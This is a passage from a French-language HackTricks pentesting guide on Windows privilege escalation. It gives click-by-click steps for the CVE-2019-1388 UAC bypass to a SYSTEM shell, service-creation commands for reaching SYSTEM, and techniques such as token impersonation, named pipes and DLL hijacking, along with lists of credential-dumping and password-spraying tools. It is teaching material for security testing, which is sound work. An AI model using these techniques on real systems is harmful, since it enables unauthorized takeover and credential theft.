$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## De l'utilisateur à faibles privilèges à NT\AUTHORITY SYSTEM (CVE-2019-1388) / Contournement de l'UAC

Si vous avez accès à l'interface graphique (via console ou RDP) et que l'UAC est activé, dans certaines versions de Microsoft Windows, il est possible d'exécuter un terminal ou tout autre processus tel que "NT\AUTHORITY SYSTEM" à partir d'un utilisateur non privilégié.

Cela permet d'escalader les privilèges et de contourner l'UAC en même temps avec la même vulnérabilité. De plus, il n'est pas nécessaire d'installer quoi que ce soit et le binaire utilisé pendant le processus est signé et émis par Microsoft.

Certains des systèmes affectés sont les suivants :
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Pour exploiter cette vulnérabilité, il est nécessaire d'effectuer les étapes suivantes :

```
1) Cliquez avec le bouton droit sur le fichier HHUPD.EXE et exécutez-le en tant qu'Administrateur.

2) Lorsque l'invite UAC apparaît, sélectionnez "Afficher plus de détails".

3) Cliquez sur "Afficher les informations du certificat de l'éditeur".

4) Si le système est vulnérable, en cliquant sur le lien URL "Délivré par", le navigateur web par défaut peut apparaître.

5) Attendez que le site se charge complètement et sélectionnez "Enregistrer sous" pour faire apparaître une fenêtre explorer.exe.

6) Dans le chemin d'adresse de la fenêtre de l'explorateur, entrez cmd.exe, powershell.exe ou tout autre processus interactif.

7) Vous aurez maintenant une invite de commande "NT\AUTHORITY SYSTEM".

8) N'oubliez pas d'annuler l'installation et l'invite UAC pour revenir à votre bureau.
```

Vous avez tous les fichiers et informations nécessaires dans le dépôt GitHub suivant :

https://github.com/jas502n/CVE-2019-1388

## De niveau d'intégrité moyen d'Administrateur à niveau d'intégrité élevé / Contournement de l'UAC

Lisez ceci pour **en savoir plus sur les niveaux d'intégrité** :

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Ensuite **lisez ceci pour en savoir plus sur l'UAC et les contournements de l'UAC :**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **De niveau d'intégrité élevé à Système**

### **Nouveau service**

Si vous exécutez déjà un processus de niveau d'intégrité élevé, le **passage à SYSTEM** peut être facile en **créant et exécutant un nouveau service** :
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Depuis un processus à haute intégrité, vous pourriez essayer **d'activer les entrées de registre AlwaysInstallElevated** et **installer** un shell inversé en utilisant un wrapper _**.msi**_.\
[Plus d'informations sur les clés de registre impliquées et comment installer un package _.msi_ ici.](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Vous pouvez** [**trouver le code ici**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate à tous les privilèges de jeton

Si vous avez ces privilèges de jeton (probablement trouvés dans un processus déjà à haute intégrité), vous pourrez **ouvrir presque n'importe quel processus** (hors processus protégés) avec le privilège SeDebug, **copier le jeton** du processus, et créer un **processus arbitraire avec ce jeton**.\
En utilisant cette technique, on choisit généralement **n'importe quel processus exécuté en tant que SYSTEM avec tous les privilèges de jeton** (_oui, il existe des processus SYSTEM sans tous les privilèges de jeton_).\
**Vous pouvez trouver un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Cette technique est utilisée par meterpreter pour s'élever en `getsystem`. La technique consiste à **créer un pipe puis créer/abuser d'un service pour écrire dans ce pipe**. Ensuite, le **serveur** qui a créé le pipe en utilisant le privilège **`SeImpersonate`** pourra **usurper le jeton** du client du pipe (le service) obtenant ainsi des privilèges SYSTEM.\
Si vous voulez [**en savoir plus sur les named pipes, vous devriez lire ceci**](./#named-pipe-client-impersonation).\
Si vous voulez lire un exemple de [**comment passer d'une intégrité élevée à System en utilisant des named pipes, vous devriez lire ceci**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si vous parvenez à **détourner une dll** en cours de **chargement** par un **processus** exécuté en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Par conséquent, le Dll Hijacking est également utile pour ce type d'élévation de privilèges, et de plus, il est **beaucoup plus facile à réaliser à partir d'un processus à haute intégrité** car il aura des **permissions d'écriture** sur les dossiers utilisés pour charger les dlls.\
**Vous pouvez** [**en savoir plus sur le Dll hijacking ici**](dll-hijacking.md)**.**

### **De Administrateur ou Service Réseau à System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### De LOCAL SERVICE ou NETWORK SERVICE à tous les privilèges

**Lire :** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Plus d'aide

[Binaires statiques d'impacket](https://github.com/ropnop/impacket_static_binaries)

## Outils utiles

**Meilleur outil pour rechercher des vecteurs d'élévation de privilèges locaux Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Vérifie les mauvaises configurations et les fichiers sensibles (**[**vérifier ici**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Détecté.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Vérifie certaines mauvaises configurations possibles et collecte des informations (**[**vérifier ici**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Vérifie les mauvaises configurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Il extrait les informations de session enregistrées de PuTTY, WinSCP, SuperPuTTY, FileZilla et RDP. Utiliser -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrait les identifiants du Gestionnaire d'identification. Détecté.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Pulvérise les mots de passe recueillis à travers le domaine**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh est un outil de spoofing et d'homme du milieu pour ADIDNS/LLMNR/mDNS/NBNS en PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Énumération basique de Windows pour l'élévation de privilèges**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Recherche de vulnérabilités connues d'élévation de privilèges (OBSOLÈTE pour Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Vérifications locales **(Nécessite des droits d'administrateur)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Recherche de vulnérabilités connues d'élévation de privilèges (doit être compilé avec VisualStudio) ([**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Énumère l'hôte à la recherche de mauvaises configurations (plus un outil de collecte d'informations que d'élévation de privilèges) (doit être compilé) **(**[**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrait les identifiants de nombreux logiciels (exe précompilé sur github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portage de PowerUp en C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Vérifie les mauvaises configurations (exécutable précompilé sur github). Non recommandé. Ne fonctionne pas bien sous Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Vérifie les mauvaises configurations possibles (exe à partir de python). Non recommandé. Ne fonctionne pas bien sous Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Outil créé à partir de ce post (il n'a pas besoin d'accesschk pour fonctionner correctement mais peut l'utiliser).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Vous devez compiler le projet en utilisant la version correcte de .NET ([voir ceci](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Pour voir la version installée de .NET sur l'hôte victime, vous pouvez faire :
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliographie

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
